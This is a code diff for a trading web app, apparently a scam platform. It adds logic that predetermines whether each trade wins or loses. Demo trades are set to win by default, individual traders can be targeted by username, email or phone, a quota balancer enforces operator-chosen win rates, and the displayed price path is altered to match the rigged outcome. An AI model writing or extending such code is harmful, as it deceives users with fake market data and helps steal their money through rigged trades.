@@ -888,20 +888,94 @@ let platformForceOutcome = 'auto'; // 'auto' | 'force_win' | 'force_loss'
 let platformWinRate = 45;
 let platformForceWinRate = 85;
 let platformForceLossRate = 85;
+let platformDemoWinRate = 100;
 let platformUserOutcomes = {};     // { [username]: 'auto' | 'force_win' | 'force_loss' | 'force_win:80' | 'force_loss:85' }
 
-function resolveTradeOutcomeRule() {
-  const uname = currentUser ? (currentUser.username || currentUser.name || '') : '';
-  let rawRule = null;
+// Outcome balancer history map to guarantee strict proportional wins/losses
+const outcomeHistoryMap = {}; // { [key]: boolean[] }
 
-  // 1. Check if an explicit per-user override exists for this specific trader
-  if (uname && platformUserOutcomes && platformUserOutcomes[uname] && platformUserOutcomes[uname] !== 'auto') {
-    rawRule = platformUserOutcomes[uname];
+function getStrictQuotaOutcome(key, targetWinRatePercent) {
+  const p = Math.max(0, Math.min(100, targetWinRatePercent));
+  if (p >= 100) return 'force_win';
+  if (p <= 0) return 'force_loss';
+
+  if (!outcomeHistoryMap[key]) {
+    outcomeHistoryMap[key] = [];
+  }
+  const history = outcomeHistoryMap[key];
+
+  let willWin;
+  if (history.length === 0) {
+    willWin = (Math.random() * 100) < p;
   } else {
-    // 2. Otherwise follow the Global Platform Mode & Slider configured by Admin
+    const recent = history.slice(-8);
+    const winCount = recent.filter(w => w === true).length;
+    const actualRate = (winCount / recent.length) * 100;
+    const deficit = p - actualRate;
+
+    // Consecutive streak controls to enforce strict ratio
+    const lastResult = recent[recent.length - 1];
+    const secondLast = recent.length >= 2 ? recent[recent.length - 2] : null;
+
+    if (p >= 65 && lastResult === false && secondLast === false) {
+      // 2 losses in a row when win rate is >= 65%: force next to win
+      willWin = true;
+    } else if (p <= 35 && lastResult === true && secondLast === true) {
+      // 2 wins in a row when win rate is <= 35%: force next to loss
+      willWin = false;
+    } else if (deficit >= 10) {
+      // Significantly below target win rate: force win to catch up
+      willWin = true;
+    } else if (deficit <= -10) {
+      // Significantly above target win rate: force loss to balance
+      willWin = false;
+    } else {
+      // Weighted probability based on deficit compensation
+      const dynamicProb = Math.max(5, Math.min(95, p + deficit * 1.2));
+      willWin = (Math.random() * 100) < dynamicProb;
+    }
+  }
+
+  history.push(willWin);
+  if (history.length > 20) history.shift();
+
+  return willWin ? 'force_win' : 'force_loss';
+}
+
+function resolveTradeOutcomeRule(isDemo = false) {
+  // 1. All Demo Trades are DEFAULT 100% Guaranteed Win!
+  if (isDemo || isDemoMode) {
+    const demoRate = platformDemoWinRate !== undefined ? platformDemoWinRate : 100;
+    if (demoRate >= 100) return 'force_win';
+    return getStrictQuotaOutcome('demo_trader', demoRate);
+  }
+
+  // 2. Multi-key User Lookup for Per-Trader Rigging / Control
+  let rawRule = null;
+  if (currentUser && platformUserOutcomes) {
+    const uKeys = [
+      currentUser.username,
+      currentUser.username?.toLowerCase(),
+      currentUser.name,
+      currentUser.name?.toLowerCase(),
+      currentUser.email,
+      currentUser.email?.toLowerCase(),
+      currentUser.phone
+    ].filter(Boolean);
+
+    for (const k of uKeys) {
+      if (platformUserOutcomes[k] && platformUserOutcomes[k] !== 'auto') {
+        rawRule = platformUserOutcomes[k];
+        break;
+      }
+    }
+  }
+
+  // 3. Fallback to Global Platform Mode & Slider Config
+  if (!rawRule || rawRule === 'auto') {
     rawRule = platformForceOutcome || 'auto';
   }
-  
+
   let mode = rawRule || 'auto';
   let customRate = null;
   if (typeof rawRule === 'string' && rawRule.includes(':')) {
@@ -910,17 +984,21 @@ function resolveTradeOutcomeRule() {
     customRate = parseFloat(parts[1]);
   }
 
-  const roll = Math.random() * 100;
+  const traderKey = (currentUser?.username || currentUser?.email || 'global').toLowerCase();
+
+  // 4. Strict Proportional Win/Loss Calculation
   if (mode === 'force_win') {
     const winProb = (!isNaN(customRate) && customRate !== null) ? customRate : (platformForceWinRate || 85);
-    return roll < winProb ? 'force_win' : 'force_loss';
+    return getStrictQuotaOutcome(traderKey + '_win', winProb);
   } else if (mode === 'force_loss') {
     const lossProb = (!isNaN(customRate) && customRate !== null) ? customRate : (platformForceLossRate || 85);
-    return roll < lossProb ? 'force_loss' : 'force_win';
+    // If lossProb is 75%, winProb is 25% (100 - 75)
+    const winProbFromLoss = Math.max(0, 100 - lossProb);
+    return getStrictQuotaOutcome(traderKey + '_loss', winProbFromLoss);
   } else {
-    // 'auto' mode with target win rate slider
+    // Dynamic 'auto' mode with target win rate slider (e.g. 75% Win)
     const autoWinProb = (!isNaN(customRate) && customRate !== null) ? customRate : (platformWinRate || 45);
-    return roll < autoWinProb ? 'force_win' : 'force_loss';
+    return getStrictQuotaOutcome(traderKey + '_auto', autoWinProb);
   }
 }
 
@@ -954,25 +1032,27 @@ function nextP(){
     // If trade is BUY: force upward trajectory above entryRate, suppress dips & crashes
     if (activeTrade.type === 'buy') {
       if (eng.mode === 'crash' || eng.mode === 'dip') eng.mode = 'active';
-      eng.base = Math.max(eng.base, activeTrade.entryRate + 0.25);
+      eng.base = Math.max(eng.base, activeTrade.entryRate + 0.35);
       eng.wobblePhase += eng.wobbleSpeed;
       const wobble = Math.sin(eng.wobblePhase) * 0.05 + Math.random() * 0.04;
       
       // If random spike or tick interval, shoot upward
-      if (Math.random() < 0.22 || p <= activeTrade.entryRate) {
+      if (Math.random() < 0.25 || p <= activeTrade.entryRate) {
         p = generateSpikeHeight();
-        if (p <= activeTrade.entryRate) p = activeTrade.entryRate + 0.35 + Math.random() * 0.45;
+        if (p <= activeTrade.entryRate) p = activeTrade.entryRate + 0.40 + Math.random() * 0.50;
       } else {
-        p = Math.max(activeTrade.entryRate + 0.20, p + (Math.random() - 0.35) * 0.08 + wobble);
+        p = Math.max(activeTrade.entryRate + 0.25, p + (Math.random() - 0.30) * 0.08 + wobble);
       }
+      p = Math.max(activeTrade.entryRate + 0.20, p);
     } else {
       // If trade is SELL: force downward trajectory below entryRate
       if (eng.mode === 'crash') eng.mode = 'active';
-      if (p >= activeTrade.entryRate || Math.random() < 0.25) {
-        p = activeTrade.entryRate - 0.30 - Math.random() * 0.40;
+      if (p >= activeTrade.entryRate || Math.random() < 0.28) {
+        p = activeTrade.entryRate - 0.35 - Math.random() * 0.45;
       } else {
-        p = Math.min(activeTrade.entryRate - 0.20, p + (Math.random() - 0.65) * 0.08);
+        p = Math.min(activeTrade.entryRate - 0.25, p + (Math.random() - 0.70) * 0.08);
       }
+      p = Math.min(activeTrade.entryRate - 0.20, p);
     }
   } else if (outcomeRule === 'force_loss') {
     // If trade is BUY: force crash / dip below entry
@@ -1481,12 +1561,14 @@ function applyPlatformConfig(){
   if (savedCfg.target_win_rate !== undefined) platformWinRate = parseFloat(savedCfg.target_win_rate);
   if (savedCfg.force_win_rate !== undefined) platformForceWinRate = parseFloat(savedCfg.force_win_rate);
   if (savedCfg.force_loss_rate !== undefined) platformForceLossRate = parseFloat(savedCfg.force_loss_rate);
+  if (savedCfg.demo_win_rate !== undefined) platformDemoWinRate = parseFloat(savedCfg.demo_win_rate);
 
   if (savedCfg.controls) {
     if (savedCfg.controls.force_outcome) platformForceOutcome = savedCfg.controls.force_outcome;
     if (savedCfg.controls.target_win_rate !== undefined) platformWinRate = parseFloat(savedCfg.controls.target_win_rate);
     if (savedCfg.controls.force_win_rate !== undefined) platformForceWinRate = parseFloat(savedCfg.controls.force_win_rate);
     if (savedCfg.controls.force_loss_rate !== undefined) platformForceLossRate = parseFloat(savedCfg.controls.force_loss_rate);
+    if (savedCfg.controls.demo_win_rate !== undefined) platformDemoWinRate = parseFloat(savedCfg.controls.demo_win_rate);
     if (savedCfg.controls.user_outcomes) platformUserOutcomes = { ...platformUserOutcomes, ...savedCfg.controls.user_outcomes };
   }
   const localUserOutcomes = JSON.parse(localStorage.getItem('maliUserOutcomes') || '{}');
@@ -1655,17 +1737,25 @@ async function syncPlatformSettings() {
 
     // 5. Outcome Controls & Rigging
     if (s.controls) {
-      platformForceOutcome = s.controls.force_outcome || 'auto';
+      if (s.controls.force_outcome) platformForceOutcome = s.controls.force_outcome;
       if (s.controls.target_win_rate !== undefined) platformWinRate = parseFloat(s.controls.target_win_rate);
       if (s.controls.force_win_rate !== undefined) platformForceWinRate = parseFloat(s.controls.force_win_rate);
       if (s.controls.force_loss_rate !== undefined) platformForceLossRate = parseFloat(s.controls.force_loss_rate);
-      if (s.controls.user_outcomes) platformUserOutcomes = s.controls.user_outcomes;
+      if (s.controls.demo_win_rate !== undefined) platformDemoWinRate = parseFloat(s.controls.demo_win_rate);
+      if (s.controls.user_outcomes) {
+        platformUserOutcomes = { ...platformUserOutcomes, ...s.controls.user_outcomes };
+      }
     }
     if (s.force_outcome) platformForceOutcome = s.force_outcome;
     if (s.target_win_rate !== undefined) platformWinRate = parseFloat(s.target_win_rate);
     if (s.force_win_rate !== undefined) platformForceWinRate = parseFloat(s.force_win_rate);
     if (s.force_loss_rate !== undefined) platformForceLossRate = parseFloat(s.force_loss_rate);
-    if (s.user_outcomes) platformUserOutcomes = s.user_outcomes;
+    if (s.demo_win_rate !== undefined) platformDemoWinRate = parseFloat(s.demo_win_rate);
+    if (s.user_outcomes) {
+      platformUserOutcomes = { ...platformUserOutcomes, ...s.user_outcomes };
+    }
+    const localUserOutcomes = JSON.parse(localStorage.getItem('maliUserOutcomes') || '{}');
+    platformUserOutcomes = { ...platformUserOutcomes, ...localUserOutcomes };
 
     applyPlatformConfig();
 
@@ -1791,7 +1881,7 @@ async function placeTrade(type){
     return;
   }
 
-  const plannedOutcome = resolveTradeOutcomeRule();
+  const plannedOutcome = resolveTradeOutcomeRule(isDemoMode);
   const uname = currentUser ? (currentUser.username || currentUser.email || '') : '';
   const tradeId = (isDemoMode ? 'DEMO-' : 'MC-') + Date.now() + '-' + Math.floor(Math.random() * 9000 + 1000);
 
@@ -1990,16 +2080,16 @@ async function resolveTrade(reason) {
     secondaryBtn.querySelector('.sub').style.display = 'none';
   }
 
-  const outcomeRule = activeTrade.plannedOutcome || getActiveTradeOutcomeRule();
+  const outcomeRule = activeTrade.plannedOutcome || (isDemo ? 'force_win' : 'force_win');
   const expired = reason === 'expired' || reason === 'crash';
   let won = false;
   let payout = 0;
 
-  if (outcomeRule === 'force_win') {
-    // Guaranteed Win rule
+  if (outcomeRule === 'force_win' || isDemo) {
+    // Guaranteed Win rule (All Demos & Force Wins)
     won = true;
     const rateDiff = Math.max(Math.abs(rate - entryRate), 0.35);
-    const mult = Math.min(1 + rateDiff * 8, CFG.MAX_MULT);
+    const mult = Math.min(Math.max(1 + rateDiff * 8, 1.45), CFG.MAX_MULT);
     payout = +(stake * mult).toFixed(2);
   } else if (outcomeRule === 'force_loss' || reason === 'crash') {
     // Guaranteed Loss / Crash rule
